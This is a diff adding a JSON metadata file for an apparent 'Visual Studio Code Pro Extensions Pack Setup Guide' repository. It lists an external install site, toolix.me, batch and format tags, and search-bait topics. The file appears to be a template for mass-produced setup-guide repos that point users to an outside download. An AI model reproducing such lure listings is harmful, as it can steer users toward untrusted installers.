@@ -1,0 +1,23 @@
+{
+  "repo": "visual-studio-code-pro-extensions-pack-setup-guide",
+  "product": "Visual Studio Code Pro Extensions Pack Setup Guide",
+  "kind": "dev",
+  "install_type": "toolix",
+  "install_url": "https://toolix.me/",
+  "batch": "new3",
+  "format": "license-md-toolix-v1",
+  "category": "dev",
+  "topics": [
+    "visual-studio-code",
+    "code-extensions",
+    "language-servers",
+    "debug-adapters",
+    "workspace-trust",
+    "vscode-setup-failed-fix",
+    "how-to-install-vscode",
+    "vscode-windows",
+    "vscode-desktop-2026",
+    "vscode-desktop-package"
+  ],
+  "site": "toolix.me"
+}
